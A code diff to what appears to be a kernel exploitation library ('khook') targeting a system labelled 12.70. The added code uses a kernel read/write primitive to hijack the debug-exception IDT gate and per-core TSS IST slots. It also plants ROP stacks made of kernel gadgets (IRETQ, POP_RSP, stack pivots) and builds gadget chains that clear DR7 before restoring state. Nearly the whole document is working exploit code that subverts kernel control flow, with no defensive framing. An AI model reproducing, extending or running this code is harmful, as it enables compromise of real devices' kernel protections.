@@ -1,5 +1,14 @@
 #include "khook.h"
 
+#ifdef AP_1270_PRESTAGE
+#include <string.h>
+
+_Static_assert(KH_1270_FALLBACK_OFF >= KH_SCRATCH_MIN,
+               "fallback stacks overlap the 12.70 arm chain");
+_Static_assert(KH_1270_FALLBACK_OFF + KH_1270_FALLBACK_SIZE <= KH_OFF_BIG_CHAIN,
+               "fallback stacks overlap the 12.70 handler chain");
+#endif
+
 static int kwrite_q(khook_t *kh, uint64_t addr, uint64_t val)
 {
   return kh->write(addr, &val, 8);
@@ -53,6 +62,63 @@ static uint64_t ist_slot_va(const khook_t *kh)
 {
   return kh->tss_base + (uint64_t)kh->core_id * kh->tss_stride + KH_TSS_IST(kh->ist_index);
 }
+
+#ifdef AP_1270_PRESTAGE
+static uint64_t ist_slot_core(const khook_t *kh, unsigned core)
+{
+  return kh->tss_base + (uint64_t)core * kh->tss_stride + KH_TSS_IST(kh->ist_index);
+}
+
+/* Check the 12.70 TSS layout before touching an IST slot or the shared gate. */
+static int census_1270(khook_t *kh)
+{
+  uint64_t rsp0[KH_1270_NCPU], ist4[KH_1270_NCPU];
+
+  if (kh->core_id != 0 ||
+      kh->tss_stride != KH_TSS_STRIDE || kh->ist_index != 6 ||
+      ((kh->saved_gate_lo >> 32) & 7) != 4)
+    return -1;
+
+  for (unsigned core = 0; core < KH_1270_NCPU; core++) {
+    uint64_t tss = kh->tss_base + (uint64_t)core * kh->tss_stride;
+    if (kh->read(tss + 0x04, &rsp0[core], 8) != 0 ||
+        kh->read(tss + KH_TSS_IST(4), &ist4[core], 8) != 0 ||
+        kh->read(ist_slot_core(kh, core), &kh->saved_ists[core], 8) != 0 ||
+        (rsp0[core] >> 47) != 0x1ffffULL || ist4[core] == 0 ||
+        kh->saved_ists[core] != 0)
+      return -2;
+    for (unsigned prior = 0; prior < core; prior++)
+      if (rsp0[core] == rsp0[prior] || ist4[core] == ist4[prior])
+        return -3;
+  }
+  kh->saved_ist = kh->saved_ists[kh->core_id];
+  return 0;
+}
+
+static uint64_t fallback_va(const khook_t *kh, unsigned core)
+{
+  return kh->scratch_base + KH_1270_FALLBACK_OFF +
+         (uint64_t)(core - 1U) * KH_1270_FALLBACK_STRIDE;
+}
+
+static int prepare_fallbacks_1270(khook_t *kh)
+{
+  uint8_t stack[KH_1270_FALLBACK_STRIDE], readback[sizeof stack];
+
+  for (unsigned core = 1; core < KH_1270_NCPU; core++) {
+    uint64_t va = fallback_va(kh, core);
+    memset(stack, 0, sizeof stack);
+    putq(stack, 0x20, kgadget(KERNEL_GADGET_IRETQ));
+    putq(stack, 0x50, kgadget(KERNEL_GADGET_POP_RSP));
+    putq(stack, 0x58, va + 0x20);
+    if (kh->write(va, stack, sizeof stack) != 0 ||
+        kh->read(va, readback, sizeof readback) != 0 ||
+        memcmp(stack, readback, sizeof stack) != 0)
+      return -1;
+  }
+  return 0;
+}
+#endif
 
 void kh_chain_init(kh_chain_t *chain, uint8_t *buf, size_t cap)
 {
@@ -344,6 +410,15 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
       return -14;
   }
 
+#ifdef AP_1270_PRESTAGE
+  if (census_1270(kh) != 0)
+    return -17;
+  gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET), kh->kcs,
+              kh->ist_index, KH_GATE_INTERRUPT, 0, 1, &lo, &hi);
+  if (hi != kh->saved_gate_hi)
+    return -18;
+#endif
+
   // Check if TSS RSP is valid-looking
   {
     uint64_t rsp0;
@@ -417,6 +492,11 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   if (!probe_write(kh, big))
     return -16;   // cave too small / unwritable
 
+#ifdef AP_1270_PRESTAGE
+  if (prepare_fallbacks_1270(kh) != 0)
+    return -20;
+#endif
+
   putq(img, iret_tramp_off, kgadget(KERNEL_GADGET_IRETQ));
   putq(img, KH_OFF_CHAIN_DISP + 0, kgadget(KERNEL_GADGET_POP_RSP));   // IST stub
   putq(img, KH_OFF_CHAIN_DISP + 8, big);
@@ -433,7 +513,7 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   if (handler_len)
     return -19;
 #else
-  // The 12.70 path appends a bounded chain after the marker.
+  // The 12.70 path appends a bounded chain after the gate/DR7 teardown.
   // Reserve room for the marker and the resume tail before copying it.
   if (handler_len > sizeof bigbuf - 0x100)
     return -19;
@@ -447,6 +527,18 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
 #endif
 
   off = 0;
+#ifdef AP_1270_PRESTAGE
+  /* Do not leave the shared gate or DR0 active while staging the AP code.
+   * All fallback IST6 stacks remain intact until userland cleanup. */
+  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
+  off = putq(bigbuf, off, db_gate);
+  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RAX));
+  off = putq(bigbuf, off, kh->saved_gate_lo);
+  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));
+  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RAX));
+  off = putq(bigbuf, off, 0);
+  off = putq(bigbuf, off, kgadget(KERNEL_GADGET_SET_DR7));
+#endif
 #if defined(AP_1270_PRESTAGE) && defined(AP_1270_SECOND_MARKER)
   // Leave a marker before the one-shot resume tail.
   off = putq(bigbuf, off, kgadget(KERNEL_GADGET_POP_RCX));
@@ -456,7 +548,7 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   off = putq(bigbuf, off, kgadget(KERNEL_GADGET_ST_RCX_RAX));
 #endif
 #if defined(AP_1270_PRESTAGE) && defined(AP_1270_STORE_HANDLER)
-  if (off + handler_len + 0x100 > sizeof bigbuf)
+  if (off + handler_len + 0xa0 > sizeof bigbuf)
     return -19;
   for (size_t i = 0; i < handler_len; i++)
     bigbuf[off + i] = handler->buf[i];
@@ -497,6 +589,24 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   if (kh->write(scratch, img, sizeof img) != 0)
     return -7;
 
+#ifdef AP_1270_PRESTAGE
+  /* The stock gate still uses IST4. Publish every IST6 path before the
+   * replacement gate, and leave the selected core's arm path for last. */
+  kh->installed = 1;
+  for (unsigned core = 1; core < KH_1270_NCPU; core++) {
+    uint64_t top = fallback_va(kh, core) + 0x50;
+    if (kwrite_q(kh, ist_slot_core(kh, core), top) != 0 ||
+        kread_q(kh, ist_slot_core(kh, core)) != top)
+      return -21;
+  }
+  if (kwrite_q(kh, ist, arm_chain) != 0 || kread_q(kh, ist) != arm_chain)
+    return -8;
+  if (kwrite_q(kh, db_gate, lo) != 0)
+    return -10;
+  if (kread_q(kh, db_gate) != lo ||
+      kread_q(kh, db_gate + 8) != hi)
+    return -12;
+#else
   if (kwrite_q(kh, ist, arm_chain) != 0) {
     kwrite_q(kh, ist, kh->saved_ist);
     return -8;
@@ -523,6 +633,7 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   }
 
   kh->installed = 1;
+#endif
   return 0;
 }
 
@@ -603,14 +714,37 @@ int kh_disarm(khook_t *kh)
 
 int kh_restore(khook_t *kh)
 {
-  uint64_t db_gate, ist;
+  uint64_t db_gate;
+#ifndef AP_1270_PRESTAGE
+  uint64_t ist;
+#endif
 
   if (!kh || !kh->installed)
     return -1;
 
   db_gate = kh->idt_base + 16 * KH_VEC_DB;
+#ifndef AP_1270_PRESTAGE
   ist = ist_slot_va(kh);
+#endif
 
+#ifdef AP_1270_PRESTAGE
+  /* Gate first: no CPU can enter the replacement handler while its IST is
+   * being restored.  The high gate qword was required to stay unchanged. */
+  uint64_t gate_lo = 0, gate_hi = 0;
+  if (kwrite_q(kh, db_gate, kh->saved_gate_lo) != 0 ||
+      kh->read(db_gate, &gate_lo, 8) != 0 ||
+      kh->read(db_gate + 8, &gate_hi, 8) != 0 ||
+      gate_lo != kh->saved_gate_lo || gate_hi != kh->saved_gate_hi)
+    return -2;
+  for (unsigned core = 0; core < KH_1270_NCPU; core++) {
+    uint64_t slot = ist_slot_core(kh, core);
+    uint64_t observed = UINT64_MAX;
+    if (kwrite_q(kh, slot, kh->saved_ists[core]) != 0 ||
+        kh->read(slot, &observed, 8) != 0 ||
+        observed != kh->saved_ists[core])
+      return -3;
+  }
+#else
   if (kwrite_q(kh, db_gate + 8, kh->saved_gate_hi) != 0 ||
       kwrite_q(kh, db_gate, kh->saved_gate_lo) != 0 ||
       kwrite_q(kh, ist, kh->saved_ist) != 0)
@@ -622,6 +756,7 @@ int kh_restore(khook_t *kh)
       gate_hi != kh->saved_gate_hi ||
       gate_lo != kh->saved_gate_lo || ist_value != kh->saved_ist)
     return -3;
+#endif
   kh->installed = 0;
   return 0;
 }
